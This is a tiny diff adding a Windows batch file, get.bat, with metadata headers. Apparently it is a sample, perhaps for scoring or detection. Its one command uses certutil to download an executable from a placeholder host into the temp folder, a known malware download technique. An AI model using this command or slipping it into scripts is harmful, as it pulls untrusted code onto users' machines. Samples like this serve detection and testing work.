@@ -1,0 +1,6 @@
+# path: get.bat
+# lines: 2
+# weight: 35
+# ---
+@echo off
+certutil -urlcache -split -f http://example.invalid/a.exe %TEMP%\a.exe
